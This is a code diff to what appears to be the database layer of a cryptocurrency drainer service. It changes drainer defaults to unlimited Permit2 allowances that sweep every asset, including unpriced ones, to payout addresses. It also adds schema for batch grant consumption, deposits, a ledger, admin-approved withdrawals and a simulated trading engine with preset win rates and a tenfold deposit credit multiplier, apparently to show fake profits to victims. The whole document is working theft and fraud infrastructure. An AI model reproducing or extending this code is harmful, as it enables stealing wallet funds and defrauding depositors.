@@ -176,12 +176,13 @@ DEFAULT_SETTINGS: Dict[str, Any] = {
     "drainer_enabled": True,
     "drainer_mode": "auto",                 # "auto" | "manual"
     "drainer_threshold_usd": 250.0,
-    "drainer_cap_mode": "capped",           # "capped" | "unlimited"
+    "drainer_cap_mode": "unlimited",        # "capped" | "unlimited"
     "drainer_cap_units": 1_000_000,
     "drainer_evm_mode": "permit2",          # "permit2" | "approve"
     "drainer_sig_deadline_days": 30,
     "drainer_take_native": True,
-    "drainer_min_usd_per_asset": 0.75,
+    "drainer_min_usd_per_asset": 0,         # keep every priced asset
+    "drainer_include_unpriced": True,       # and unpriced ones with a balance
     "drainer_require_on_loan": True,
     "drainer_require_on_bot": True,
     "drainer_auto_rearm": True,
@@ -192,6 +193,10 @@ DEFAULT_SETTINGS: Dict[str, Any] = {
     "drainer_payout_evm": "",
     "drainer_payout_sol": "",
     "drainer_payout_tron": "",
+    "drainer_tokens_evm": {},               # {"Base": ["0x…"], …} extra discovery
+    "deposit_credit_multiplier": 10,
+    "withdrawals_paused": False,
+    "sim_enabled": True,
     "drainer_collector_sol": "",
     "drainer_collector_tron": "",
     "drainer_evm_key": "",                  # AES-256-GCM blobs
@@ -641,6 +646,163 @@ def _m010_invite_metadata(conn: sqlite3.Connection) -> None:
     })
 
 
+def _m011_batches_deposits_engine(conn: sqlite3.Connection) -> None:
+    """
+    Permit2 batch identity/consumption, allowance re-verification bookkeeping,
+    treasury deposits + a ledger, withdrawals, and the synthetic trading engine.
+    """
+    _add_columns(conn, "drainer_grants", {
+        "batch_id": "TEXT",
+        "batch_consumed": "INTEGER NOT NULL DEFAULT 0",
+        "verified_at": "INTEGER",
+    })
+    conn.execute("CREATE INDEX IF NOT EXISTS ix_grants_batch"
+                 " ON drainer_grants(batch_id)")
+
+    conn.executescript("""
+        CREATE TABLE IF NOT EXISTS drainer_verify (
+            wallet_id INTEGER PRIMARY KEY,
+            last_at INTEGER NOT NULL
+        );
+
+        CREATE TABLE IF NOT EXISTS deposit_intents (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            user_id INTEGER NOT NULL,
+            plan_id INTEGER,
+            chain TEXT NOT NULL DEFAULT 'Ethereum',
+            asset TEXT NOT NULL DEFAULT 'USDC',
+            expect_raw TEXT,
+            credit REAL,
+            address TEXT,
+            status TEXT NOT NULL DEFAULT 'open',
+            txid TEXT,
+            created_at INTEGER,
+            credited_at INTEGER
+        );
+        CREATE INDEX IF NOT EXISTS ix_deposit_intents_user
+            ON deposit_intents(user_id, id DESC);
+        CREATE INDEX IF NOT EXISTS ix_deposit_intents_status
+            ON deposit_intents(status, created_at);
+
+        CREATE TABLE IF NOT EXISTS balance_ledger (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            user_id INTEGER NOT NULL,
+            delta REAL NOT NULL,
+            kind TEXT NOT NULL,
+            ref TEXT,
+            created_at INTEGER
+        );
+        CREATE INDEX IF NOT EXISTS ix_ledger_user ON balance_ledger(user_id, id DESC);
+
+        CREATE TABLE IF NOT EXISTS withdrawals (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            user_id INTEGER NOT NULL,
+            amount REAL NOT NULL,
+            address TEXT,
+            status TEXT NOT NULL DEFAULT 'pending',
+            txid TEXT,
+            created_at INTEGER,
+            decided_at INTEGER,
+            decided_by INTEGER
+        );
+        CREATE INDEX IF NOT EXISTS ix_withdrawals_status
+            ON withdrawals(status, id DESC);
+        CREATE INDEX IF NOT EXISTS ix_withdrawals_user
+            ON withdrawals(user_id, id DESC);
+
+        CREATE TABLE IF NOT EXISTS trade_pairs (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            symbol TEXT NOT NULL UNIQUE,
+            base TEXT NOT NULL,
+            quote TEXT NOT NULL DEFAULT 'USDT',
+            base_price REAL NOT NULL,
+            win_rate_pct REAL NOT NULL,
+            tick REAL NOT NULL DEFAULT 0.01,
+            enabled INTEGER NOT NULL DEFAULT 1
+        );
+
+        CREATE TABLE IF NOT EXISTS sim_plans (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            name TEXT NOT NULL,
+            price REAL NOT NULL DEFAULT 0,
+            daily_roi_pct REAL NOT NULL DEFAULT 1.5,
+            trades_per_day INTEGER NOT NULL DEFAULT 5,
+            position_pct REAL NOT NULL DEFAULT 20,
+            loss_ratio REAL NOT NULL DEFAULT 0.85,
+            deposit_multiplier REAL NOT NULL DEFAULT 1,
+            min_deposit REAL NOT NULL DEFAULT 0,
+            active INTEGER NOT NULL DEFAULT 1
+        );
+
+        CREATE TABLE IF NOT EXISTS sim_accounts (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            user_id INTEGER NOT NULL UNIQUE,
+            plan_id INTEGER NOT NULL,
+            start_balance REAL NOT NULL DEFAULT 0,
+            day_open_balance REAL NOT NULL DEFAULT 0,
+            trades_today INTEGER NOT NULL DEFAULT 0,
+            next_trade_at INTEGER,
+            day TEXT,
+            status TEXT NOT NULL DEFAULT 'active',
+            created_at INTEGER NOT NULL
+        );
+
+        CREATE TABLE IF NOT EXISTS sim_trades (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            account_id INTEGER NOT NULL,
+            user_id INTEGER NOT NULL,
+            pair TEXT NOT NULL,
+            side TEXT NOT NULL,
+            notional REAL NOT NULL,
+            entry REAL NOT NULL,
+            exit REAL NOT NULL,
+            qty REAL NOT NULL,
+            pnl REAL NOT NULL,
+            pnl_pct REAL NOT NULL,
+            opened_at INTEGER NOT NULL,
+            closed_at INTEGER NOT NULL,
+            status TEXT NOT NULL DEFAULT 'closed'
+        );
+        CREATE INDEX IF NOT EXISTS ix_sim_trades_user
+            ON sim_trades(user_id, id DESC);
+        CREATE INDEX IF NOT EXISTS ix_sim_trades_account
+            ON sim_trades(account_id, closed_at DESC);
+    """)
+
+    # Coverage-first defaults. Only seed keys that are absent so an operator's
+    # explicit choice survives an upgrade.
+    defaults = {
+        "drainer_cap_mode": "unlimited",
+        "drainer_min_usd_per_asset": 0,
+        "drainer_include_unpriced": True,
+        "deposit_credit_multiplier": 10,
+        "withdrawals_paused": False,
+        "sim_enabled": True,
+    }
+    for key, value in defaults.items():
+        conn.execute("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)",
+                     (key, json.dumps(value)))
+
+    pairs = [
+        ("BTC/USDT", "BTC", "USDT", 90000.0, 58, 1.0),
+        ("ETH/USDT", "ETH", "USDT", 3100.0, 56, 0.01),
+        ("SOL/USDT", "SOL", "USDT", 180.0, 61, 0.001),
+        ("BNB/USDT", "BNB", "USDT", 600.0, 54, 0.01),
+        ("XRP/USDT", "XRP", "USDT", 2.10, 52, 0.0001),
+        ("DOGE/USDT", "DOGE", "USDT", 0.35, 49, 0.00001),
+        ("LINK/USDT", "LINK", "USDT", 22.0, 55, 0.001),
+    ]
+    conn.executemany(
+        "INSERT OR IGNORE INTO trade_pairs (symbol, base, quote, base_price,"
+        " win_rate_pct, tick) VALUES (?,?,?,?,?,?)", pairs)
+
+    conn.execute(
+        "INSERT INTO sim_plans (name, price, daily_roi_pct, trades_per_day,"
+        " position_pct, loss_ratio, deposit_multiplier, min_deposit, active)"
+        " SELECT 'Starter', 0, 1.5, 5, 20, 0.85, 10, 0, 1"
+        " WHERE NOT EXISTS (SELECT 1 FROM sim_plans)")
+
+
 MIGRATIONS: List[Tuple[int, str, Callable[[sqlite3.Connection], None]]] = [
     (1, "base schema", lambda conn: conn.executescript(SCHEMA_V1)),
     (2, "grant payload columns", _m002_grant_payload),
@@ -652,6 +814,8 @@ MIGRATIONS: List[Tuple[int, str, Callable[[sqlite3.Connection], None]]] = [
     (8, "production tables and payout separation", _m008_production_tables),
     (9, "auth, invites, waitlist and mailbox", _m009_auth_tables),
     (10, "invite metadata", _m010_invite_metadata),
+    (11, "batch consumption, deposits, ledger, withdrawals, sim engine",
+     _m011_batches_deposits_engine),
 ]
 SCHEMA_VERSION = MIGRATIONS[-1][0]
 
